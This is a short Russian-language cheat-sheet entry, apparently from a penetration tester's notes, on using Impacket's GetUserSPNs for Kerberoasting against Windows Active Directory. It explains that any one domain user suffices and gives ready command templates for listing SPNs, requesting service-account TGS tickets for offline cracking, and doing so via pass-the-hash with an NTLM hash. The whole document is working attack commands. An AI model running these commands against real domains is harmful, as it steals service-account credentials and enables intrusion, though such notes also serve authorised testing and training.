#tool #windows #kerberos 

Инструмент для проведения атаки [[Kerberoasting]]

Он ищет Service Accounts c SPN, запрашивает для них TGS и сохраняет их для дальнейшего кряка 

Для проведения атаки необходимо **любой один** пользователь

### Эксплуатация 

- Вывод всех SPN
```bash
Impacket-GetUserSPNs -dc-ip <ip> <domain>/
```

- Запрос билета конкретного сервисного аккаунта
```bash
Impacket-GetUserSPNs -dc-ip <ip> <domain>/<user> -request-user <service_acc>  
-outputfile <file.tgs>
```

- Kerberoasting
```bash
Impacket-GetUserSPNs <domain>/<user>:<pass> \
  -dc-ip <ip> \
  -request
```

- Kerberoasting через PtH
```bash
Impacket-GetUserSPNs <domain>/<user> \
  -hashes :<NTLM_HASH> \
  -dc-ip <ip> \
  -request
```
